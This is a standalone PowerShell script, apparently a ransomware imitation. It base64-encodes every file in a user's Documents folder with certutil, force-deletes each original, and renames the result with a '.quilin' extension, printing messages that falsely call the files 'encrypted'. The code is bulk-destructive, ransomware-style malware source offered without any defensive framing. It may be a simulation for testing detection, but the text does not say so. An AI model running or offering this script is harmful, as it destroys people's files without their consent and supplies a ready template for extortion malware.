# Set the target folder
$TargetFolder = "C:\Users\User\Documents"  # Change this as needed

# Get all files in the folder
Get-ChildItem -Path $TargetFolder -File | ForEach-Object {
    $OriginalPath = $_.FullName
    $BaseName = $_.BaseName
    $QuilinPath = Join-Path -Path $TargetFolder -ChildPath "$BaseName.quilin"
    $TempEncoded = "$OriginalPath.b64"

    # Skip already encrypted .quilin files
    if ($_.Extension -eq ".quilin") {
        Write-Host "[!] Skipping already encrypted file: $OriginalPath"
        return
    }
    Write-Host "[+] Encoding file: $OriginalPath"

    # Run certutil to encode
    certutil -f -encode "$OriginalPath" "$TempEncoded" | Out-Null

    # If encoding succeeded, replace original with .quilin version
    if (Test-Path $TempEncoded) {
        try {
            Remove-Item "$OriginalPath" -Force
            Rename-Item "$TempEncoded" "$QuilinPath"
            Write-Host "    [+] Saved as: $QuilinPath"
        } catch {
            Write-Host ("    [!] Error processing " + $OriginalPath + ": " + $_.Exception.Message)
        }
    } else {
        Write-Host "    [!] Encoding failed for: $OriginalPath"
    }
}

Write-Host "`n[OK] Done. Files encoded and renamed to .quilin"
